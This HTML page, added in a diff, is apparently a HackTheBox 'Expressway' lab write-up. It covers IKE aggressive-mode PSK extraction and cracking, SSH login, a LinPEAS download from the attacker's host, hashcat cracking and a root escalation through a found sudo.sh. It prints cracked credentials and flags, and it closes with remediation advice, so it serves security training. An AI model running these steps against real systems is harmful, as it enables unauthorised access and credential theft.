@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="HackTheBox Expressway Writeup by Rachel Murphy" />
+  <title>HTB: Expressway | Rachel Murphy</title>
+
+  <!-- Base site styling -->
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+      <script src="/assets/css/js/script.js" defer></script>
+
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <h1>Expressway Writeup</h1>
+    <p>HackTheBox Labs</p>
+    <nav>
+      <ul>
+        <li><a href="/index.html">Home</a></li>
+        <li><a href="../index.html">Writeups</a></li>
+        <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+        <li><a href="/tools/index.html">Tools</a></li>
+        <li><a href="/about.html">About</a></li>
+      </ul>
+    </nav>
+  </header>
+
+<main>
+
+      <h2>Box summary</h2>
+      <p><strong>Name:</strong> Expressway (hostname) / <strong>IP:</strong> 10.10.11.87</p>
+      <p><strong>Difficulty:</strong> Medium</p>
+      <p><strong>Primary initial access vector:</strong> IKE / IPsec PSK discovered via <code>ike-scan</code> and cracked with <code>psk-crack</code>.</p>
+      <p>Short summary: I found a PSK from aggressive IKE scans, used it to SSH as <code>ike@expressway.htb</code>, performed local enumeration (linpeas) to identify several interesting artifacts including a curious set of files under <code>/tmp/sudowoot.stage.*</code>, and eventually used a saved private key to SSH in and execute an unexpected <code>sudo.sh</code> that granted root.</p>
+
+      <hr />
+
+      <h2>Recon & initial enumeration</h2>
+
+      <h3>AutoRecon</h3>
+      <div class="code">
+        <button class="copy-btn" data-target="e-cmd1">Copy</button>
+        <pre><code id="e-cmd1">autorecon -t ip.txt -vvv --ignore-plugin-checks</code></pre>
+      </div>
+
+      <h3>Nmap</h3>
+      <p>Only SSH (22) was open on TCP; I focused on UDP port 500 (IKE) as an initial access vector.</p>
+
+      <figure>
+        <img src="./images/Pasted image 20250921115729.png" alt="Nmap TCP" style="max-width:100%">
+        <figcaption>Figure 1 — TCP nmap output (only port 22 open).</figcaption>
+      </figure>
+
+      <figure>
+        <img src="./images/Pasted image 20250921115517.png" alt="Nmap UDP" style="max-width:100%">
+        <figcaption>Figure 2 — UDP scan showing port 500 (IKE).</figcaption>
+      </figure>
+
+      <h3>IKE fingerprinting</h3>
+      <div class="code">
+        <pre><code id="e-cmd2">ike-scan -M -A 10.10.11.87</code></pre>
+      </div>
+
+      <figure>
+        <img src="./images/Pasted image 20250921125251.png" alt="ike-scan results" style="max-width:100%">
+        <figcaption>Figure 3 — IKE scan revealed interesting vendor IDs and a user <code>ike@expressway.htb</code>.</figcaption>
+      </figure>
+
+      <div class="code">
+        <pre><code id="e-cmd3">ike-scan -A --trans=1,2,3,4,5 10.10.11.87</code></pre>
+      </div>
+
+      <div class="code">
+        <pre><code id="e-cmd4">ike-scan -A --pskcrack 10.10.11.87</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250921125832.png" alt="pskcrack output" style="max-width:100%">
+        <figcaption>Figure 4 — Extracted PSK hash ready for cracking.</figcaption>
+      </figure>
+
+      <div class="code">
+        <pre><code id="e-cmd5">psk-crack psk.hash --dictionary=/usr/share/wordlists/rockyou.txt</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250921130102.png" alt="psk cracked" style="max-width:100%">
+        <figcaption>Figure 5 — PSK cracked to <code>freakingrockstarontheroad</code>.</figcaption>
+      </figure>
+
+      <hr />
+
+      <h2>Initial access</h2>
+      <p>I tested the PSK against the SSH user discovered earlier:</p>
+
+      <div class="code">
+        <pre><code id="e-cmd6">ssh ike@expressway.htb</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250921130603.png" alt="ssh in as ike" style="max-width:100%">
+        <figcaption>Figure 6 — Successful login as <code>ike</code> (PSK worked with SSH or the account accepted the credentials).</figcaption>
+      </figure>
+
+      <p>Got the user flag shortly after logging in:</p>
+
+      <figure>
+        <img src="../images/Pasted image 20250921130736.png" alt="user flag" style="max-width:100%">
+        <figcaption>Figure 7 — User flag: <code>2f9a51ed06749dced2a51416156f26b1</code>.</figcaption>
+      </figure>
+
+      <hr />
+
+      <h2>Local enumeration</h2>
+      <p>Standard checks: <code>sudo -l</code>, find SUIDs, capabilities, processes and scheduled tasks. I ran LinPEAS and inspected output for unusual files and credentials.</p>
+
+      <div class="code">
+        <pre><code id="e-cmd7">wget http://10.10.16.5/linpeas.sh</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250921132022.png" alt="linpeas wget" style="max-width:100%">
+        <figcaption>Figure 8 — Downloading LinPEAS for enumeration.</figcaption>
+      </figure>
+
+      <h3>Interesting LinPEAS findings</h3>
+      <ul>
+        <li>A temporary directory <code>/tmp/sudowoot.stage.*</code> with a set of files (woot1337, nsswitch conf, etc).</li>
+        <li>Potentially writable group file and a strange native library <code>woot1337.so.2</code> that segfaulted when inspected.</li>
+        <li>Some APR1-MD5 password hashes (htpasswd-like) that I saved for cracking.</li>
+      </ul>
+
+      <figure>
+        <img src="../images/Pasted image 20250921134656.png" alt="linpeas files" style="max-width:100%">
+        <figcaption>Figure 9 — Files discovered under <code>/tmp/sudowoot.stage.*</code>.</figcaption>
+      </figure>
+
+      <figure>
+        <img src="../images/Pasted image 20250921135106.png" alt="executable timestamps" style="max-width:100%">
+        <figcaption>Figure 10 — Executable list (timestamps) showing custom sudo tooling and related binaries.</figcaption>
+      </figure>
+
+      <h3>Exploration of the Woot files</h3>
+      <p>There was a small C project with a main and a shared object that crashed. I attempted to compile and link the pieces to reproduce or instrument them.</p>
+
+      <figure>
+        <img src="../images/Pasted image 20250921141101.png" alt="woot files" style="max-width:100%">
+        <figcaption>Figure 11 — C source found in the <code>woot</code> directory.</figcaption>
+      </figure>
+
+      <figure>
+        <img src="../images/Pasted image 20250921141323.png" alt="woot c code" style="max-width:100%">
+        <figcaption>Figure 12 — snippet from <code>woot1337.c</code>.</figcaption>
+      </figure>
+
+      <h4>Compilation attempts</h4>
+      <p>First attempts hit the classic <code>undefined reference to main</code> error. I researched fixes and attempted to compile into object files and link with a <code>main.c</code> (the repo had split sources).</p>
+
+      <figure>
+        <img src="../images/Pasted image 20250921141622.png" alt="undefined reference error" style="max-width:100%">
+        <figcaption>Figure 13 — Error: <em>undefined reference to `main`</em> from gcc.</figcaption>
+      </figure>
+
+      <p>I followed the community hint (link in notes) to compile the C file into an object first:</p>
+
+      <div class="code">
+        <pre><code id="e-cmd8">gcc woot1337.c -c</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250921141637.png" alt="gcc -c success" style="max-width:100%">
+        <figcaption>Figure 14 — Compiled to object file.</figcaption>
+      </figure>
+
+      <div class="code">
+        <pre><code id="e-cmd9">gcc woot1337.o main.c -o woot1337</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250921141801.png" alt="link failed" style="max-width:100%">
+        <figcaption>Figure 15 — Linking attempt (this didn't succeed for me).</figcaption>
+      </figure>
+
+      <p>I inspected the shared library file and ran it (it segfaulted). This indicated it was either a purposely broken binary or required a specific environment to execute.</p>
+
+      <div class="code">
+        <pre><code id="e-cmd10">file woot1337.so.2</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250921142038.png" alt="file woot1337.so" style="max-width:100%">
+        <figcaption>Figure 16 — File command output on the shared object.</figcaption>
+      </figure>
+
+      <figure>
+        <img src="../images/Pasted image 20250921142130.png" alt="segfault" style="max-width:100%">
+        <figcaption>Figure 17 — Running it caused a segfault — possible rabbit hole.</figcaption>
+      </figure>
+
+      <p>At this point I marked this as a potential rabbit hole and moved to other LinPEAS findings (password hashes and running services).</p>
+
+      <hr />
+
+      <h2>Other interesting finds</h2>
+
+      <h3>APR1-MD5 htpasswd hashes</h3>
+      <figure>
+        <img src="../images/Pasted image 20250921143119.png" alt="apr1 hash" style="max-width:100%">
+        <figcaption>Figure 18 — APR1-MD5 hash found.</figcaption>
+      </figure>
+
+      <div class="code">
+        <pre><code id="e-cmd11">hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250921143323.png" alt="hashcat apr1" style="max-width:100%">
+        <figcaption>Figure 19 — Hashcat mode 1600 used for APR1-MD5.</figcaption>
+      </figure>
+
+      <figure>
+        <img src="../images/Pasted image 20250921143530.png" alt="apr1 cracked" style="max-width:100%">
+        <figcaption>Figure 20 — APR1 hash cracked to <code>password</code> — not directly useful but noted.</figcaption>
+      </figure>
+
+      <h3>Processes & services</h3>
+      <p>LinPEAS showed a TFTP server and a fail2ban process; and a strange system binary called <code>laurel</code> running as <code>_laurel</code>.</p>
+
+      <figure>
+        <img src="../images/Pasted image 20250921144512.png" alt="process tftp" style="max-width:100%">
+        <figcaption>Figure 21 — <code>in.tftpd</code> and <code>fail2ban-server</code> processes observed.</figcaption>
+      </figure>
+
+      <figure>
+        <img src="../images/Pasted image 20250921144624.png" alt="fail2ban" style="max-width:100%">
+        <figcaption>Figure 22 — fail2ban in place — explains why brute force attempts would be unwise.</figcaption>
+      </figure>
+
+      <figure>
+        <img src="../images/Pasted image 20250921144818.png" alt="laurel binary" style="max-width:100%">
+        <figcaption>Figure 23 — <code>_laurel</code> / <code>/usr/local/sbin/laurel</code> process — potentially custom service.</figcaption>
+      </figure>
+
+      <hr/>
+
+      <h2>Key-based SSH & unexpected root via <code>sudo.sh</code></h2>
+      <p>While pivoting through other leads I exported an SSH key found on the machine for the `ike` user and used it locally to SSH in as <code>ike</code> again. When I logged in via the saved key, a curious <code>sudo.sh</code> file appeared in the home directory. Executing it elevated me to root — unexpected but valid path to root on this box.</p>
+
+      <figure>
+        <img src="../images/Pasted image 20250922141404.png" alt="save ssh key" style="max-width:100%">
+        <figcaption>Figure 24 — Saving the SSH key (local copy on Kali).</figcaption>
+      </figure>
+
+      <div class="code">
+        <pre><code id="e-cmd12">chmod 600 id_rsa_ike</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250922141501.png" alt="chmod key" style="max-width:100%">
+        <figcaption>Figure 25 — Key permissions set.</figcaption>
+      </figure>
+
+      <div class="code">
+        <pre><code id="e-cmd13">ssh -i id_rsa_ike ike@expressway.htb</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250922141539.png" alt="ssh using key" style="max-width:100%">
+        <figcaption>Figure 26 — SSH with private key (connected back as <code>ike</code>).</figcaption>
+      </figure>
+
+      <p>After logging in, a file named <code>sudo.sh</code> was present. I inspected parts of it and then executed it.</p>
+
+      <figure>
+        <img src="../images/Pasted image 20250922141057.png" alt="sudo sh parts" style="max-width:100%">
+        <figcaption>Figure 27 — Portions of <code>sudo.sh</code> showing the behavior (sensitive details removed from screenshot).</figcaption>
+      </figure>
+
+      <div class="code">
+        <pre><code id="e-cmd14">./sudo.sh</code></pre>
+      </div>
+
+      <figure>
+        <img src="../images/Pasted image 20250922140959.png" alt="execute sudo sh" style="max-width:100%">
+        <figcaption>Figure 28 — Executed <code>sudo.sh</code>.</figcaption>
+      </figure>
+
+      <figure>
+        <img src="../images/Pasted image 20250922141208.png" alt="root" style="max-width:100%">
+        <figcaption>Figure 29 — Root shell obtained. Root flag: <code>54ecb924554a99270bf8450b391330ce</code>.</figcaption>
+      </figure>
+
+      <hr />
+
+      <h2>Thought process & decisions</h2>
+      <p>Key decision points:</p>
+      <ul>
+        <li>Focus on IKE (UDP 500) early because it’s a clear external-facing VPN/remote-access channel — yields credentials faster than blind brute force.</li>
+        <li>Avoid deep rabbit-holes immediately (the <code>woot1337.so.2</code> segmentation fault and the mini C-project). I attempted compile/debug steps to see if the library could be abused but deprioritized when results pointed to low ROI and segfaults.</li>
+        <li>Switch back to higher-ROI LinPEAS findings (hashes, writable temp files, ssh keys, and suspicious services). The saved key + sudo script yielded the fastest route to root.</li>
+        <li>When a file or process looks unusual (like <code>laurel</code>), take screenshots and note for remediation — they’re often custom admin tools that might be misconfigured or grant over-privileged actions.</li>
+      </ul>
+
+      <hr />
+
+      <h2>Remediation recommendations</h2>
+      <p>Based on findings, recommended fixes for a real environment:</p>
+      <ul>
+        <li><strong>Harden VPN/IKE:</strong> Do not use weak or widely reused PSKs. Use certificates for IPsec or unique, long PSKs per client. Monitor IKE logs for unexpected aggressive-mode negotiation attempts.</li>
+        <li><strong>Key management:</strong> Do not leave private keys on systems accessible by other accounts. Protect keys with strict filesystem permissions and rotate compromised keys immediately.</li>
+        <li><strong>Audit temporary directories:</strong> Files in <code>/tmp</code> should be created with secure permissions and cleanup policies. If software drops temporary library files, ensure they’re not writable by non-privileged users.</li>
+        <li><strong>Remove embedded helper scripts granting root:</strong> Investigate the origin of scripts like <code>sudo.sh</code>. If a startup or provisioning script requires interactive privileged steps, replace them with properly managed, auditable automation or restrict execution to authorized accounts only.</li>
+        <li><strong>Least privilege for services:</strong> Services such as custom daemons (e.g., <code>laurel</code>) should run with minimal privileges and be audited and code-reviewed. Use AppArmor/SELinux or similar LSMs to reduce the blast radius.</li>
+        <li><strong>Logging & monitoring:</strong> Monitor for unusual SSH key additions, sudo executions, and unexpected binaries in <code>/tmp</code>. Alert on file modifications to critical locations.</li>
+      </ul>
+
+      <hr />
+
+      <h2>References & notes</h2>
+      <ul>
+        <li>ike-scan / psk-crack docs</li>
+        <li>LinPEAS — Linux Smart Enumeration</li>
+        <li>StackOverflow troubleshooting for <code>gcc: undefined reference to `main`</code> during partial compile/link workflows</li>
+      </ul>
+
+    </article>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="wrap site-footer">
+      <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc" target="_blank" rel="noopener">GitHub</a></p>
+      <p><a href="/../writeups/index.html">Back to Writeups</a> | <a href="../index.html">Home</a></p>
+    </div>
+  </footer>
+
+  <script src="/../assets/js/script.js"></script>
+</body>
+</html>
